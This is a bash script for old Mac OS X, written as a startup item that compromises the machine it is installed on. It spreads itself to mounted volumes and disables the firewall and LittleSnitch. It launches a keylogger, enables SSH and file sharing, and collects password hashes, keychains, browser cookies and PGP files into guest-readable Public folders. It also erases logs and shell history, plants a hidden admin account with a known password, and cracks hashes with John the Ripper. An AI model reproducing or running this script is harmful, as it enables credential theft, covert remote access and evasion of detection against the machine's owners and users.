#! /bin/bash


##################################
# opener - a startup script to turn on services and gather user info & hashes for Mac OS X
##################################

# This script is written for bash (as is noted by the very first line of this script)

# You need an admin level user name and password or physical access (boot from a CD or
# firewire/usb, ignore permissions on the internal drive) to install this
# It should go in /Library/StartupItems
# If you change the location to /System/Library/StartupItems be sure to
# also change the paths in this script as needed!
# It should be in it's own folder - the script and the folder must have the exact same name
# there should be two other files in that folder:
# the StartupParameters.plist for this script
# and AddToCronTasks.txt (with commands you want to add to their cron tasks.)

# infect any mounted OS X startup volumes
ls /Volumes | while read vol; do
if test -d "/Volumes/$vol/Library" ; then
mkdir "/Volumes/$vol/Library/StartupItems"
cp -R /Library/StartupItems/opener "/Volumes/$vol/Library/StartupItems/"
chmod -Rf 777 "/Volumes/$vol/Library/StartupItems/"
fi
done

# clobber utmp so that when we connect they can't see us
rm /var/run/utmp
touch /var/run/utmp

# disable OS X built-in firewall
defaults write /Library/Preferences/com.apple.sharing.firewall state no

# clobber LittleSnitch
sudo killall -m LittleSnitch

# launch krec if it's installed in /Library/Preferences (it's a keystroke recorder)
chmod -R 777 /Library/Preferences/krec.app/
open /Library/Preferences/KRec.app/Contents/MacOS/KRec

# Make sure we can write to the hostconfig, ssh and cron files
chflags nouchg /etc/hostconfig /etc/xinetd.d/ssh /etc/daily /etc/weekly /etc/monthly
chmod 777 /etc/hostconfig /etc/xinetd.d/ssh /etc/daily /etc/weekly /etc/monthly

# Replace their ssh file with our version which turns on ssh
echo "service ssh" > /private/etc/xinetd.d/ssh
echo "{" >> /private/etc/xinetd.d/ssh
echo "disable = no" >> /private/etc/xinetd.d/ssh
echo "socket_type = stream" >> /private/etc/xinetd.d/ssh
echo "wait = no" >> /private/etc/xinetd.d/ssh
echo "user = root" >> /private/etc/xinetd.d/ssh
echo "server = /usr/libexec/sshd-keygen-wrapper" >> /private/etc/xinetd.d/ssh
echo "server_args = -i" >> /private/etc/xinetd.d/ssh
echo "groups = yes" >> /private/etc/xinetd.d/ssh
echo "flags = REUSE IPv6" >> /private/etc/xinetd.d/ssh
echo "session_create = yes" >> /private/etc/xinetd.d/ssh
echo "}" >> /private/etc/xinetd.d/ssh

# append these commands to their hostconfig file to turn on File Sharing
# (and to turn on SSH in 10.2.8 and below)
echo "AFPSERVER=-YES-" >> /etc/hostconfig
echo "SSHSERVER=-YES-" >> /etc/hostconfig
# Uncomment these lines to turn on windows sharing or web sharing
#echo "SMBSERVER=-YES-" >> /etc/hostconfig
#echo "WEBSERVER=-YES-" >> /etc/hostconfig


##################################
# gather hashes and other info
##################################
# create a hidden folder called .info and some subfolders
mkdir /.info /.info/Library /.info/Library/Preferences /.info/private /.info/private/var /.info/keychains
mkdir /.info/Library/Application\ Support/ /.info/nistuff /.info/Applications

# copy some interesting data and all the hashes into the info folder
cp -R /Library/ApplePasswordServer /.info/Library/ApplePasswordServer # for OS X SERVER
cp -R /private/var/db /.info/private/var/db # all the netinfo stuff
cp -R /Library/Keychains/ /.info/Library/Keychains/
cp -R /Library/Preferences/DNSUpdate /.info/Library/Preferences/ # DynDNS locator beacon prefs
cp -R /private/var/db/shadow/hash /.info/private/var/db/shadow/hash # just making sure
cp /Library/WebServer/users /.info/Library/WebServer/users
cp /System/Library/CoreServices/SystemVersion.plist /.info/System/Library/CoreServices/SystemVersion.plist
cp /Library/Preferences/Netopia/Netopia\ Preferences /.info/Library/Preferences/Netopia/Netopia\ Preferences
cp /Library/Preferences/Netopia/TB2\ Activation\ Key /.info/Library/Preferences/Netopia/TB2\ Activation\ Key
cp /Library/Preferences/com.apple.MCX.plist /.info/Library/Preferences/
/usr/bin/ditto -rsrcFork /Library/Application\ Support/Adobe/Adobe\ Registration\ Database /.info/Library/Application\ Support/
/usr/bin/ditto -rsrcFork /Library/Application\ Support/Connectix/Virtual\ PC/Virtual\ PC\ 6.0\ Registration.vpf /.info/Library/Application\ Support/
/usr/bin/ditto -rsrcFork /Applications/Microsoft\ Office\ X/Office/OfficePID /.info/Applications/

# Get rid of a big file we don't need
rm /.info/private/var/db/locate.database

# change to the info folder directory
cd /.info

# grab netinfo user stuff (and the MD5 hashes (for . and /) if this is OS X 10.2.8 or lower)
nidump passwd . > passwdMD5
nidump passwd / > passwdMD5

# grab 10.3 samba & sha1 hashes
for name in `nireport / /users name`
do
G=`niutil -readprop / /users/${name} generateduid`
if [ -n "$G" ] ; then
H=`cat /private/var/db/shadow/hash/${G}`
echo ${name}:${H:1:32}:${H:33:32}::: > passwdNT4
echo ${name}:${H:56:40}::: > passwdSHA1
fi
done

# Gather all netinfo information for users
cd /.info/nistuff
for username in `nireport . /users name` ; do
niutil -read . /users/$username > $username.txt
done

# change to the Users folder
cd /Users

# read user names from netinfo
# if folders with those usernames appear in the /Users directory, then create the /.info/Users/username folders
# then copy the StickiesDatabase file, keychains, recent servers & other interesting files from each user
mkdir /.info /.info/Users
cd /Users
for item in `nireport / /users name`
do
if test -d ./$item  ; then
mkdir /.info/Users/$item /.info/Users/$item/Library /.info/$item/Documents /.info/Users/$item/Library/Application\ Support
mkdir /.info/Users/$item/Library/Logs /.info/Users/$item/Library/Preferences /.info/Users/$item/Library/Application\ Support/Chimera
mkdir /.info/Users/$item/Library/Mozilla /.info/Users/$item/Library/Phoenix /.info/Users/$item/Library/Application\ Support/OmniWeb
mkdir /.info/Users/$item/Library/Cookies
cp -f $item/Library/StickiesDatabase /.info/Users/$item/StickiesDatabase
/usr/bin/ditto -rsrcFork $item/Library/Keychains/ /.info/Users/$item/Library/Keychains/
# Now let's grab some other files that might be interesting
/usr/bin/ditto -rsrcFork $item/Documents/PGP /.info/Users/$item/Documents/
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Carracho/ /.info/Users/$item/Library/Application\ Support/Carracho/
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Fire/ /.info/Users/$item/Library/Application\ Support/Fire/
/usr/bin/ditto -rsrcFork $item/Library/Logs/AIM/ /.info/Users/$item/Library/Logs/AIM/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Yahoo\!\ Messenger\ Preferences /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Server\ Settings\ Preferences /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Server\ Settings\ Favorites /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Server\ Admin\ Preferences /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/iVisit\ Preferences /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/iCab\ Preferences /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/FileMaker\ Preferences /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Fetch\ Shortcuts /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.geekspiff.chickenofthevnc.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.carracho.enchilada.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.WorkgroupManager.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.security.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.mail.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.internetconnect.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.internetconfig.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.aol.aim.plist /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Carracho\ Client\ Prefs /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.yahoo.Messenger* /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Chimera/Profiles/default/*.slt/cookies.txt /.info/Users/$item/Library/Application\ Support/Chimera/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/iCab\ Preferences/iCab\ Cookies /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Mozilla/Profiles/default/*.slt/cookies.txt /.info/Users/$item/Library/Mozilla/
/usr/bin/ditto -rsrcFork $item/Library/Phoenix/Profiles/default/*.slt/Cache/cookies.txt /.info/Users/$item/Library/Phoenix/
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/OmniWeb/Cookies.xml /.info/Users/$item/Library/Application\ Support/OmniWeb/
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/OmniWeb\ 5/Cookies.xml /.info/Users/$item/Library/Application\ Support/OmniWeb/
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Opera*Preferences/cookies*.dat /.info/Users/$item/Library/Preferences/
/usr/bin/ditto -rsrcFork $item/Library/Cookies/Cookies.plist /.info/Users/$item/Library/Cookies
# A certain program keeps a certain file here called ".DS_Store " (note the trailing space)
/usr/bin/ditto -rsrcFork $item/Library/Preferences/.DS_Store\  /.info/Users/$item/Library/Preferences/
# Uncomment the next lines for the AOL or ICQ prefs, those folders could be pretty large though.
#/usr/bin/ditto -rsrcFork $item/Library/Preferences/America\ Online/ /.info/Users/$item/Library/Preferences/
#/usr/bin/ditto -rsrcFork $item/Library/Preferences/ICQ/ /.info/Users/$item/Library/Preferences/
#/usr/bin/ditto -rsrcFork $item/.ssh/ /.info/Users/$item/ssh/
# Now grab urls from the recent servers and throw them in a file in each .info/user folder
for filename in `ls ./$item/Library/Recent\ Servers`
do
strings -13 ./$item/Library/Recent\ Servers/$filename/rsrc | grep "://" >> /.info/Users/$item/RecentServersList.txt
done
fi
done

# change permissions on the info folders and all the stuff we collected
chmod -Rf 777 /.info

# now copy the info folder into the Public folder of each user (since sharing will be on at restart and guest is on by default anyone can get to them)
cd /Users
chmod -Rf 777 /.info
find . -maxdepth 2 -name "Public" -type d -exec cp -R /.info '{}/.info' \;
find . -maxdepth 3 -name ".info" -type d -exec chmod -R 777 '{}' \;
rm -R /.info


##################################
# Delete log files
##################################
# Clean up after ourselves by removing logs
# first, kill syslogd so no further logs will be made until restart
killall syslogd
rm -Rf /private/var/log/
rm -Rf /Library/Logs/
rm -f /Library/Preferences/Netopia/Timbuktu\ Pro\ Log
rm -f /var/log/osxvnc.*
cd /Users
find . -maxdepth 2 -name ".bash_history" -exec rm -f '{}' \;
history -c

##################################
# Create an admin user called hacker
##################################
# create an admin user named hacker with password 1234
# note, this user will NOT appear in their SystemPreferences accounts list or the login window
# the user WILL appear in Netinfo Manager
# to remove the user later try nidump -destroy / /users/hacker
niutil -create / /users/hacker
niutil -createprop / /users/hacker uid 401
niutil -createprop / /users/hacker realname "Hacker"
niutil -createprop / /users/hacker home "/private/var/home"
niutil -createprop / /users/hacker shell "/bin/bash"
niutil -createprop / /users/hacker gid 20
niutil -createprop / /users/hacker passwd "rQ3p5/hpOpvGE" #(it's 1234)
nicl . -append /groups/admin users hacker
chown -R hacker:staff /private/var/home
chmod -Rf 700 /private/var/home

##################################
# Make the cron tasks delete the logs
##################################
# append some commands to the cron scripts
# change daily to weekly or monthly if desired (or all three)

# checks to see if the last line in the daily cron script is our last line to remove logs
# if not, we add the lines
last_line=`tail -n 1 /etc/daily`
if [ "$last_line" != "rm -f /Library/Preferences/Netopia/Timbuktu\ Pro\ Log" ] ; then
echo "rm -Rf /private/var/log/" >> /etc/daily
echo "rm -Rf /Library/Logs/" >> /etc/daily
echo "rm -f /Library/Preferences/Netopia/Timbuktu\ Pro\ Log" >> /etc/daily
fi


##################################
# run John The Ripper
##################################
# Rename the folder john1-6-33 (Mac, pre-compiled CLI version!
# Be sure to put the .chr files from the unix version into the run folder,
# you can remove the doc folder for a smaller upload)
# Upload the jtr folder to the target computer's /Library/Preferences folder
# then add this to the startup script and it will have john crack
# the target's password hashes on their own computer (instead of yours)

# You might also want to edit the john.conf file for
# "Use idle cycles only" to "Idle = Y" (so that it won't bog
# the other machine down to the point that anyone would notice!)

# make sure the john dir exists and is writable and unlocked
if [ -d /Library/Preferences/jtr/ ] ; then
chflags -R nouchg /Library/Preferences/jtr/
chmod -R 777 /Library/Preferences/jtr/

# check to see if a restore file exists and if so, just restore
if test -f /Library/Preferences/jtr/run/restore ; then
cd /Library/Preferences/jtr/
./run/john -restore &
./run/john -restore:DESs &

else

# grab 10.2.x DES hashes for john

nidump passwd . >> /Library/Preferences/jtr/passwdMD5
nidump passwd / >> /Library/Preferences/jtr/passwdMD5

# grab 10.3 samba hashes and format for john
for name in `nireport / /users name`
do
G=`niutil -readprop / /users/${name} generateduid`
if [ -n "$G" ] ; then
H=`cat /private/var/db/shadow/hash/${G}`
echo ${name}:${H:1:32}:${H:33:32}::: >> /Library/Preferences/jtr/passwdNT4
echo ${name}:${H:56:40}::: >> /Library/Preferences/jtr/passwdSHA1
fi
done

# build a bigger wordlist
if [ ! -f /Library/Preferences/jtr/wordsdone ] ; then
cat /usr/share/dict/* /Library/Preferences/jtr/run/password.lst | sort -us > /Library/Preferences/jtr/big.txt
find /Users -iname "*.txt" -type f -exec sort '{}' -us >> /Library/Preferences/jtr/big.txt \;
tr "\r" "\n" < /Library/Preferences/jtr/big.txt > /Library/Preferences/jtr/big2.txt
tr -cs "[:alnum:]" "\n" < /Library/Preferences/jtr/big2.txt > /Library/Preferences/jtr/big.txt
tr "[:upper:]" "[:lower:]" < /Library/Preferences/jtr/big.txt > /Library/Preferences/jtr/big2.txt
sort -us /Library/Preferences/jtr/big2.txt > /Library/Preferences/jtr/run/password.lst
rm /Library/Preferences/jtr/big.txt /Library/Preferences/jtr/big2.txt
touch /Library/Preferences/jtr/wordsdone
fi

# run john on the 10.3 hashes
# If there aren't any more of these type of hashes left to crack then jtr will just exit
cd /Library/Preferences/jtr/
./run/john -format:LM passwdNT4 &

# run another instance of john on the 10.2 hashes
# If there aren't any more of these type of hashes left to crack then jtr will just exit
./run/john -session:DESs -format:DES passwdMD5 &

fi
fi

##################################
# miscellaneous
##################################
# uncomment the next 2 lines if you want everyone to have full access to managed preferences
#chmod -f 777 /Library
#chmod -Rf 777 /Library/ManagedPreferences
#chmod -Rf 777 /Library/Preferences/com.apple.MCX.plist